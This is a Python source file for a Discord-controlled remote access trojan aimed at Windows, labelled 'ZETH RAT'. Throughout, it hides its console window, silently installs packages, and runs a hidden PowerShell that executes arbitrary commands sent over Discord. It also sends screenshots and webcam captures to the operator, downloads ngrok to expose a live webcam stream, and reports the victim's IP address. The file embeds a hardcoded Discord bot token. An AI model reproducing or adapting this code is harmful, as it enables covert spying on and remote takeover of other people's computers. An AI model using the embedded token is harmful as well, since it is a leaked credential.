import discord
import requests
import subprocess
import os
import sys
import io
from datetime import datetime
import ctypes
import time
import threading
import socket
import base64
import json
import webbrowser


#----RAT------


# |
# |
# |
#\ /



# hide console immediately
if sys.platform == "win32":
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

# install dependencies if not present (quietly)
try:
    import pyautogui
    from PIL import Image
    pyautogui.FAILSAFE = False
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui", "pillow", "--quiet", "--no-warn-script-location"])
    import pyautogui
    from PIL import Image
    pyautogui.FAILSAFE = False

try:
    import cv2
    import numpy as np
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "opencv-python", "numpy", "--quiet", "--no-warn-script-location"])
    import cv2
    import numpy as np

#token for Rat bot
DISCORD_TOKEN = "MTU0MjczMDk0MTI2NzU3NDg0NA.G_TQEr.Mf4kjdpPMLvLdhL0DjzDK8V1ZlxhhgzyQiUchk"

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

# hidden powershell
ps = subprocess.Popen(
    ["powershell", "-NoLogo", "-NoExit", "-Command", "-"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    bufsize=1,
    creationflags=subprocess.CREATE_NO_WINDOW
)

# video streaming server
VIDEO_PORT = 8080
video_running = False
video_thread = None
current_frame = None
frame_lock = threading.Lock()
stream_clients = []

# spam control
spam_running = False
spam_thread = None
spam_message = ""

# ============ Ngrok setup for remote video ============
def start_ngrok():
    """Download and start ngrok for port forwarding"""
    try:
        # Download ngrok if not exists
        ngrok_path = os.path.join(os.environ['TEMP'], "ngrok.exe")
        if not os.path.exists(ngrok_path):
            print("Downloading ngrok...")
            ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
            import urllib.request
            import zipfile
            
            zip_path = os.path.join(os.environ['TEMP'], "ngrok.zip")
            urllib.request.urlretrieve(ngrok_url, zip_path)
            
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(os.environ['TEMP'])
            os.remove(zip_path)
            os.chmod(ngrok_path, 0o755)
        
        # Start ngrok forwarding port 8080
        ngrok_process = subprocess.Popen(
            [ngrok_path, "http", str(VIDEO_PORT), "--log=stdout"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Wait for ngrok to start and get URL
        time.sleep(3)
        
        # Get public URL from ngrok API
        try:
            response = requests.get("http://localhost:4040/api/tunnels", timeout=5)
            data = response.json()
            public_url = data['tunnels'][0]['public_url']
            return public_url, ngrok_process
        except:
            return None, ngrok_process
            
    except Exception as e:
        return None, None

def execute_cmd(cmd):
    marker = "__CMD_DONE__"
    wrapped = f"""
    try {{
        $OutputEncoding = [Console]::OutputEncoding = [Text.Encoding]::UTF8
        {cmd}
    }} catch {{
        Write-Output "$($_.Exception.Message)"
    }}
    """

    ps.stdin.write(wrapped + "\n")
    ps.stdin.write(f'Write-Output "{marker}"\n')
    ps.stdin.flush()

    output = []
    for line in ps.stdout:
        if marker in line:
            break
        output.append(line.rstrip())

    return "\n".join(output)

def set_wallpaper(image_path):
    """Set wallpaper using PowerShell"""
    cmd = f"""
    $code = @'
using System.Runtime.InteropServices;
public class Wallpaper {{
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}}
'@
Add-Type -TypeDefinition $code -Language CSharp
[Wallpaper]::SystemParametersInfo(20, 0, "{image_path}", 3)
"""
    return execute_cmd(cmd)

def play_audio_file(file_path):
    """Play audio using PowerShell"""
    cmd = f"""
    Add-Type -AssemblyName presentationCore
    $player = New-Object System.Windows.Media.MediaPlayer
    $player.Open("{file_path}")
    $player.Play()
    Start-Sleep -Seconds 1
    """
    return execute_cmd(cmd)

def video_stream_server():
    """Simple MJPEG stream server for webcam"""
    global video_running, current_frame, stream_clients
    
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    if not cap.isOpened():
        cap = cv2.VideoCapture(1, cv2.CAP_DSHOW)
    if not cap.isOpened():
        print("No webcam")
        return
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('0.0.0.0', VIDEO_PORT))
    server_socket.listen(5)
    
    print(f"Video stream at http://localhost:{VIDEO_PORT}")
    
    while video_running:
        try:
            client_socket, addr = server_socket.accept()
            print(f"Video client connected: {addr}")
            stream_clients.append(client_socket)
            
            # Send HTTP header
            client_socket.send(b'HTTP/1.1 200 OK\r\n')
            client_socket.send(b'Content-Type: multipart/x-mixed-replace; boundary=frame\r\n\r\n')
            
            while video_running and client_socket in stream_clients:
                ret, frame = cap.read()
                if not ret:
                    break
                
                # Resize for performance
                frame = cv2.resize(frame, (640, 480))
                
                # Update current frame for screenshot
                with frame_lock:
                    current_frame = frame.copy()
                
                # Encode to JPEG
                ret, jpeg = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                if not ret:
                    continue
                
                # Send frame
                try:
                    client_socket.send(b'--frame\r\n')
                    client_socket.send(b'Content-Type: image/jpeg\r\n')
                    client_socket.send(f'Content-Length: {len(jpeg.tobytes())}\r\n\r\n'.encode())
                    client_socket.send(jpeg.tobytes())
                    client_socket.send(b'\r\n')
                except:
                    break
                
                time.sleep(0.05)  # ~20fps
                
        except Exception as e:
            print(f"Video server error: {e}")
            try:
                if client_socket in stream_clients:
                    stream_clients.remove(client_socket)
                    client_socket.close()
            except:
                pass
            time.sleep(1)
    
    cap.release()
    server_socket.close()
    print("Video server stopped")

def take_screenshot():
    try:
        pyautogui.FAILSAFE = False
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        return discord.File(img_bytes, filename=f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
    except Exception as e:
        return str(e)

def take_screenshot_full():
    try:
        pyautogui.FAILSAFE = False
        screenshot = pyautogui.screenshot(all_screens=True)
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        return discord.File(img_bytes, filename=f"fullscreen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
    except Exception as e:
        return str(e)

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            cap = cv2.VideoCapture(1, cv2.CAP_DSHOW)
        if not cap.isOpened():
            return "no webcam detected"
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return "failed to capture webcam"
        frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        img = Image.fromarray(frame_rgb)
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        return discord.File(img_bytes, filename=f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
    except Exception as e:
        return f"webcam error {str(e)}"

def spam_messages():
    """Spam messages in a loop"""
    global spam_running, spam_message, channel
    
    while spam_running:
        try:
            # Send message to discord channel
            # We need to use asyncio to send from thread
            future = asyncio.run_coroutine_threadsafe(
                channel.send(spam_message[:2000]),
                client.loop
            )
            future.result(timeout=5)
            time.sleep(1)  # Wait 1 second between messages
        except Exception as e:
            print(f"Spam error: {e}")
            time.sleep(1)

@client.event
async def on_ready():
    global channel
    try:
        guild = client.guilds[0]
        ip = requests.get("https://api.ipify.org", timeout=5).text.replace(",", "-")
        
        # Find channel created by control panel - LOOK FOR ZETH CHANNEL
        channel = discord.utils.get(guild.channels, name=f"zeth-rat-{ip}")
        if not channel:
            # Fallback - look for any control channel
            for ch in guild.channels:
                if "rat" in ch.name.lower() or "control" in ch.name.lower() or "zeth" in ch.name.lower():
                    channel = ch
                    break
            if not channel:
                channel = await guild.create_text_channel(f"ZETH-RAT-CONTROL-HERE")

        #add {ip} here later
        await channel.send(f"**ZETH RAT CONNECTED** \nSystem: {os.name}")
        
    except Exception as e:
        print(f"Error: {e}")


@client.event
async def on_message(message):
    global video_running, video_thread, spam_running, spam_thread, spam_message
    
    if not channel or message.channel.id != channel.id:
        return

    if message.author.bot:
        return

    content = message.content.lower()
    
    # --- Website visit command ---
    if content.startswith("website "):
        try:
            url = content.split(" ", 1)[1]
            # Add http:// if not present
            if not url.startswith("http"):
                url = "https://" + url
            
            # Open in default browser
            webbrowser.open(url)
            await message.channel.send(f"opened website: {url}")
        except Exception as e:
            await message.channel.send(f"error opening website: {str(e)}")
        return
    
    # --- Spam command ---
    if content.startswith("spam "):
        if spam_running:
            await message.channel.send("spam already running, use 'stop' to stop")
            return
        
        spam_message = message.content[5:]  # Get everything after "spam "
        if not spam_message:
            await message.channel.send("usage: spam [message to spam]")
            return
        
        spam_running = True
        spam_thread = threading.Thread(target=spam_messages, daemon=True)
        spam_thread.start()
        await message.channel.send(f"spam started: '{spam_message}'\ntype 'stop' to stop")
        return
    
    # --- Stop command ---
    if content == "stop":
        if spam_running:
            spam_running = False
            if spam_thread:
                spam_thread.join(timeout=2)
            await message.channel.send("spam stopped")
        else:
            await message.channel.send("no spam running")
        return
    
    # --- Screenshot commands ---
    if content == "screenshot":
        result = take_screenshot()
        if isinstance(result, discord.File):
            await message.channel.send(file=result)
        else:
            await message.channel.send(f"error {result}")
        return
    
    if content == "fullscreen":
        result = take_screenshot_full()
        if isinstance(result, discord.File):
            await message.channel.send(file=result)
        else:
            await message.channel.send(f"error {result}")
        return
    
    # --- Webcam commands ---
    if content == "webcam":
        result = capture_webcam()
        if isinstance(result, discord.File):
            await message.channel.send(file=result)
        else:
            await message.channel.send(result)
        return
    
    # --- Video stream commands ---
    if content == "videostart":
        if video_running:
            await message.channel.send("Video already running")
            return
        
        video_running = True
        video_thread = threading.Thread(target=video_stream_server, daemon=True)
        video_thread.start()
        
        # Start ngrok for remote access
        await message.channel.send("Starting ngrok for remote access...")
        public_url, ngrok_proc = start_ngrok()
        
        if public_url:
            await message.channel.send(f"**VIDEO STREAM READY**\n\nRemote URL: {public_url}\nLocal URL: http://localhost:{VIDEO_PORT}\n\nUse 'videostop' to stop")
        else:
            await message.channel.send(f"Video stream started locally at http://localhost:{VIDEO_PORT}\n(Use 'videostop' to stop)")
        return
    
    if content == "videostop":
        video_running = False
        await message.channel.send("Video stream stopping...")
        return
    
    if content == "videoframe":
        with frame_lock:
            if current_frame is None:
                await message.channel.send("No video frame available. Start video first.")
                return
            frame_rgb = cv2.cvtColor(current_frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            await message.channel.send(file=discord.File(img_bytes, filename=f"videoframe_{datetime.now().strftime('%H%M%S')}.png"))
        return
    
    # --- Background change ---
    if content == "bckgroundchange":
        if message.attachments:
            attachment = message.attachments[0]
            if attachment.filename.lower().endswith(('.png', '.jpg', '.jpeg', '.bmp', '.gif')):
                img_data = await attachment.read()
                img_path = os.path.join(os.environ['TEMP'], f"wallpaper_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
                with open(img_path, 'wb') as f:
                    f.write(img_data)
                
                result = set_wallpaper(img_path)
                await message.channel.send(f"```\nWallpaper changed\n{result}\n```")
                return
            else:
                await message.channel.send("Please attach an image file (.png, .jpg, .jpeg, .bmp, .gif)")
                return
        else:
            await message.channel.send("Please attach an image file with the 'bckgroundchange' command")
        return
    
    # --- Audio play ---
    if content == "playaudio":
        if message.attachments:
            attachment = message.attachments[0]
            if attachment.filename.lower().endswith(('.mp3', '.wav', '.m4a', '.flac', '.aac')):
                audio_data = await attachment.read()
                audio_path = os.path.join(os.environ['TEMP'], f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp3")
                with open(audio_path, 'wb') as f:
                    f.write(audio_data)
                
                result = play_audio_file(audio_path)
                await message.channel.send(f"```\nAudio playing\n{result}\n```")
                return
            else:
                await message.channel.send("Please attach an audio file (.mp3, .wav, .m4a, .flac, .aac)")
                return
        else:
            await message.channel.send("Please attach an audio file with the 'playaudio' command")
        return
    
    # --- System commands ---
    if content == "shutdown":
        result = execute_cmd("shutdown /s /t 0")
        await message.channel.send(f"```\n{result}\n```")
        return
    
    if content == "restart":
        result = execute_cmd("shutdown /r /t 0")
        await message.channel.send(f"```\n{result}\n```")
        return
    
    if content == "systeminfo":
        result = execute_cmd("systeminfo")
        await message.channel.send(f"```\n{result}\n```")
        return
    
    if content == "whoami":
        result = execute_cmd("whoami")
        await message.channel.send(f"```\n{result}\n```")
        return
    
    if content == "tasks":
        result = execute_cmd("tasklist")
        await message.channel.send(f"```\n{result}\n```")
        return
    
    if content.startswith("kill "):
        try:
            process = content.split(" ", 1)[1]
            result = execute_cmd(f"taskkill /f /im {process}")
            await message.channel.send(f"```\n{result}\n```")
        except:
            await message.channel.send("usage kill processname.exe")
        return

    # Execute any custom command
    result = execute_cmd(message.content) or "executed"

    while True:
        await message.channel.send(result[:2000])
        if len(result) < 2000:
            break
        result = result[2000:]

# Need asyncio for threading
import asyncio

try:
    client.run(DISCORD_TOKEN)
except Exception as e:
    print(f"error: {e}")